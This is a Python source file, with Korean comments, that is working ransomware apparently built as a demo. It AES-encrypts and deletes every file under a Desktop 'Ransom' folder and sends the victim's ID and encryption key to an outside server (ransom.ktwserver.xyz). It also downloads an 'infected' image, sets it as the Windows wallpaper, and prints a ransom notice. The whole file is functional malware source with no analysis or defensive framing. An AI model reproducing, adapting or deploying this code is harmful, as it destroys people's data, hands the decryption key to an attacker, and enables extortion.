import glob
import os
import shutil
import base64
import struct
import requests
import ctypes
import time
from Crypto.Cipher import AES


def encrypt_file(key, in_filename, chunk_size=1024 * 64):           # 파일 암호화 함수, chunk 크기가 클수록 처리 속도 증가
    out_filename = in_filename + '.infected'

    iv = os.urandom(16)                                             # initialize vector 초기화
    enc = AES.new(key, AES.MODE_CBC, iv)
    file_size = os.path.getsize(in_filename)

    with open(in_filename, 'rb') as infile:
        with open(out_filename, 'wb') as outfile:
            outfile.write(struct.pack('<Q', file_size))
            outfile.write(iv)

            while True:
                chunk = infile.read(chunk_size)
                if len(chunk) == 0:
                    break
                elif len(chunk) % 16 != 0:                          # padding
                    chunk += b' ' * (16 - len(chunk) % 16)

                outfile.write(enc.encrypt(chunk))


def main():
    start_path = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop') + '\Ransom'  # 바탕화면 Ransom 폴더 경로 지정
    uid_path = start_path + '\\uid.dat'                         # unique id 경로 지정
    orig_bg = ''

    if not os.path.isfile(uid_path):
        uid = os.urandom(16)                                    # unique id 지정
        uid = base64.urlsafe_b64encode(uid).decode()            # php 인자로 전달하기 때문에 urlsafe 필요
        with open(uid_path, 'w') as uid_data:
            uid_data.write(uid)
    else:
        uid = open(uid_path, 'r').read()

    key = os.urandom(16)                                        # 암호화 키 지정
    key_b64 = base64.urlsafe_b64encode(key).decode()            # php 인자로 전달하기 때문에 urlsafe 필요

    requests.get('https://ransom.ktwserver.xyz/get_data.php?uid=' + uid + '&key=' + key_b64)  # 서버에 uid 와 key 값 전송

    for filename in glob.iglob(start_path + '\**', recursive=True):      # 지정된 경로의 모든 하위 폴더 및 파일 암호화
        if os.path.isfile(filename):
            if filename != uid_path:                                     # uid 파일은 암호화에서 제외
                encrypt_file(key, filename)
                os.remove(filename)

    infected_img_url = 'https://raw.githubusercontent.com/hobang6/ransomware/master/infected.png'
    bg_path = os.path.join(os.path.join(os.environ['USERPROFILE']), 'AppData\Roaming\Microsoft\Windows\Themes')

    if os.path.isdir(bg_path + '\CachedFiles'):
        orig_bg = os.listdir(bg_path + '\CachedFiles')
        orig_bg = bg_path + '\CachedFiles\\' + orig_bg[0]

    elif os.path.isfile(bg_path + '\TranscodedWallpaper'):
        orig_bg = bg_path + '\TranscodedWallpaper'

    shutil.move(orig_bg, 'C:\original_background.png')                   # 바탕화면 이미지 원본 백업
    open('C:\infected.png', 'wb').write(requests.get(infected_img_url, allow_redirects=True).content)
    time.sleep(1.5)
    ctypes.windll.user32.SystemParametersInfoW(20, 0, 'C:\infected.png', 0)  # 바탕화면 이미지 변경
    time.sleep(1.5)
    os.remove('C:\infected.png')

    print('당신의 파일들은 랜섬웨어에 감염되었습니다!')
    os.system('pause')


if __name__ == '__main__':
    main()
